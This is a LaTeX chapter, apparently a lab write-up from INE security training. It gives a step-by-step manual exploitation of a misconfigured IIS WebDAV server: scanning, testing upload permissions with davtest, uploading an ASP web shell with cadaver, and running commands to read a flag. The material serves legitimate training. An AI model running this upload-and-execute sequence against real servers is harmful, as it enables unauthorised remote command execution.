\chapter{Lab: IIS WebDAV Manual Exploitation}
\label{lab:webdav_manual}

\begin{notebox}[Lab objective]
Exploit a misconfigured Microsoft IIS WebDAV endpoint to upload and execute a web
shell, gain command execution, and retrieve the flag --- using manual tools only
(no Metasploit exploit module).
\end{notebox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Environment}
\begin{itemize}
  \item \textbf{Attacker:} Kali Linux (INE lab environment)
  \item \textbf{Target:} \ic{demo.ine.local}
  \item \textbf{Tools:} \ic{nmap}, \ic{davtest}, \ic{cadaver}, \ic{hydra}
  \item \textbf{Credentials:} Provided by the lab
\end{itemize}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 1 --- Confirm the Target is Alive}

\begin{termbox}
ping -c 1 demo.ine.local
\end{termbox}

Confirmed reachable. Noted the IP for all subsequent commands.

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 2 --- Port Scan and Service Detection}

\begin{termbox}
nmap -sV -sC demo.ine.local
\end{termbox}

\textbf{Key findings:}
\begin{itemize}
  \item Port 80 open --- Microsoft IIS 10.0
  \item \ic{/webdav/} endpoint discovered returning 401 Unauthorized
\end{itemize}

\screenshot{assets/images/Screenshot_2025-10-18_at_12.39.13_PM.png}{nmap results showing IIS 10.0 on port 80 with /webdav/ returning 401}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 3 --- Confirm WebDAV and Test Upload Permissions with davtest}

\begin{whybox}[Why davtest before anything else]
davtest tells me two critical things: can I upload files, and will the server
execute them? If ASP execution is not possible, there is no point uploading a
shell. I need to know this before wasting time crafting a payload.
\end{whybox}

\begin{termbox}
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
\end{termbox}

\textbf{What I found:}
\begin{itemize}
  \item File upload via PUT: \textbf{SUCCESS} for multiple extensions
  \item ASP execution: \textbf{SUCCESS} --- the server executes \ic{.asp} files
  \item This confirms the full WebDAV RCE attack path is viable
\end{itemize}

\screenshot{assets/images/Screenshot_2025-10-22_at_5.03.28_PM.png}{davtest output confirming ASP upload and execution permissions}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 4 --- Upload Web Shell with Cadaver}

Kali includes built-in web shells at \ic{/usr/share/webshells/}. I used the
ASP web shell since the server executes \ic{.asp} files.

\begin{termbox}
# Find available shells
ls -al /usr/share/webshells/asp/

# Connect to WebDAV and upload
cadaver http://demo.ine.local/webdav/
# At credentials prompt:
# Username: bob
# Password: password_123321

# Inside cadaver session:
put /usr/share/webshells/asp/webshell.asp
ls    # Confirm upload
exit
\end{termbox}

\screenshot{assets/images/Screenshot_2025-10-25_at_3.30.49_PM.png}{Cadaver session uploading webshell.asp to the WebDAV directory}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 5 --- Execute Commands via Web Shell}

Opened \ic{http://demo.ine.local/webdav/webshell.asp} in the browser. The
web shell provides a command input field running on the server.

Commands executed:
\begin{termbox}
whoami          # nt authority\iusr
ipconfig        # Network configuration
dir C:\         # Directory listing of C drive
type C:\flag.txt   # Read the flag
\end{termbox}

\screenshot{assets/images/Screenshot_2025-10-26_at_10.50.35_AM.png}{Web shell running in browser with command execution output}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Step 6 --- Clean Up}

\begin{termbox}
cadaver http://demo.ine.local/webdav/
delete webshell.asp
exit
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section*{Result}

Flag retrieved via web shell command execution. Lab objective completed.

% ─────────────────────────────────────────────────────────────────────────────
\section*{Key Learning}

\begin{takebox}
\begin{itemize}
  \item The attack path here is entirely manual --- no Metasploit exploit module.
        This is valuable because it shows the underlying mechanics that the
        automated module abstracts away.
  \item davtest is essential before uploading anything. Without knowing ASP
        execution works, I could upload a payload that does nothing.
  \item Web shells are immediate and visual. Meterpreter is more powerful, but
        a web shell is faster to deploy when you just need a quick command.
  \item Cleaning up uploaded files is professional practice and part of the
        methodology.
\end{itemize}
\end{takebox}
